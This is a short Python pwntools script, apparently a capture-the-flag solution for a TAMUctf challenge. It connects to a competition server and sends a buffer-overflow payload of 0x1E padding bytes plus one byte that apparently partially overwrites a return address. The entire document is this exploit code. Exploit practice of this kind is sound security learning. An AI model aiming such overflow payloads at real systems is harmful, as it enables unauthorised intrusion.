from pwn import *

p=remote("pwn.tamuctf.com",4322)

print(p.recv(2020))
payload="A"*0x1E
payload+="\xd8"

p.sendline(payload)
print(p.recvuntil("nt.\n"))
sleep(1)
print(p.recv(2020))
